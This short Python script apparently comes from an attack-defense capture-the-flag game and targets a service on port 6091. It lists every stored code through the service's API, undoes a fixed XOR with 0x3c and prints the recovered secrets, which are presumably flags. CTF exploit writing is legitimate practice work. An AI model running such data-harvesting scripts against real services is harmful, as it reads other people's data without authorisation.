import sys
from checklib import get_initialized_session

ip = sys.argv[1]
PORT = 6091

url = f"http://{ip}:{PORT}/api"

s = get_initialized_session()

codes = s.get(f"{url}/codes/").json()['ok']

for code in codes:
    bits = s.get(f"{url}/code/{code}/").json()['ok']
    bt = bytes([int(''.join(map(str, bits[i:i+8])), 2) ^ 0x3c for i in range(0, len(bits), 8)])
    print(bt[:32].decode(), flush=True)
